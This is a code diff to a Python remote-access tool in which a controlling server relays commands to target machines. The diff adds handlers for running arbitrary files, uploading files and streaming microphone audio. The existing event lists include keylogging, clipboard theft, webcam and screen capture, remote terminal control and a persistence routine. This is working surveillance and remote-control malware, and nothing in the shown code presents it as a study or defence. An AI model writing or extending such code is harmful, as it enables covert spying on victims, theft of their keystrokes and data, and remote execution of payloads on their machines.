@@ -71,9 +71,16 @@ def forward_event(event, data, destination_room):
 # Register Admin -> Target Proxy
 ADMIN_EVENTS = [
     'mouse', 'keyboard', 'system', 'terminal_start', 'terminal_input', 'terminal_stop',
-    'file_browse', 'file_upload', 'file_delete', 'process_list', 'process_kill',
+    'file_browse', 'file_upload', 'file_delete', 'file_run', 'process_list', 'process_kill',
     'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
     'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send'
+]
+TARGET_EVENTS = [
+    'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
+    'file_list', 'file_upload_status', 'file_delete_status', 'process_data', 'process_kill_status',
+    'audio_started', 'audio_stopped', 'audio_chunk', 'audio_error', 'vitals_update',
+    'monitor_data', 'monitor_switched', 'keylog_data', 'keylog_cleared',
+    'clipboard_content', 'clipboard_status', 'chat_received', 'chat_data', 'alert_sent'
 ]
 # --- Direct Event Registration (Unique Names) ---
 def create_proxy_handler(ev_name, room_dest):
@@ -227,7 +234,7 @@ def run_client(master_url):
         sio.emit('process_data', {'processes': ps[:100]})
 
     @sio.on('file_browse')
-    def on_f_browse(data):
+    def on_file_browse(data):
         p = data.get('path', os.path.expanduser('~'))
         try:
             es = []
@@ -236,6 +243,49 @@ def run_client(master_url):
                 except: pass
             sio.emit('file_list', {'path': p.replace('\\','/'), 'entries': es})
         except Exception as e: sio.emit('file_list', {'error': str(e)})
+
+    @sio.on('file_run')
+    def on_file_run(data):
+        p = data.get('path')
+        if p and os.path.exists(p):
+            try:
+                # Use os.startfile for Windows to run/open with default handler
+                os.startfile(p)
+                logger.info(f"Executed file: {p}")
+            except Exception as e:
+                logger.error(f"Execution error: {e}")
+
+    @sio.on('file_upload')
+    def on_file_upload(data):
+        try:
+            with open(data['path'], 'wb') as f:
+                f.write(base64.b64decode(data['content']))
+            sio.emit('file_upload_status', {'success': True})
+        except Exception as e:
+            sio.emit('file_upload_status', {'success': False, 'error': str(e)})
+
+    @sio.on('audio_start')
+    def on_audio_start(data):
+        if not AUDIO_READY or client_state['audio']: return
+        client_state['audio'] = True
+        def audio_loop():
+            try:
+                import sounddevice as sd
+                def callback(indata, frames, time, status):
+                    if client_state['audio']:
+                        sio.emit('audio_chunk', {'data': base64.b64encode(indata).decode('utf-8')})
+                with sd.InputStream(callback=callback, channels=1, samplerate=22050):
+                    while client_state['audio']: time.sleep(0.1)
+            except Exception as e:
+                sio.emit('audio_error', {'error': str(e)})
+                client_state['audio'] = False
+        threading.Thread(target=audio_loop, daemon=True).start()
+        sio.emit('audio_started', {})
+
+    @sio.on('audio_stop')
+    def on_audio_stop(data):
+        client_state['audio'] = False
+        sio.emit('audio_stopped', {})
 
     # Persistence & Start
     def persist():
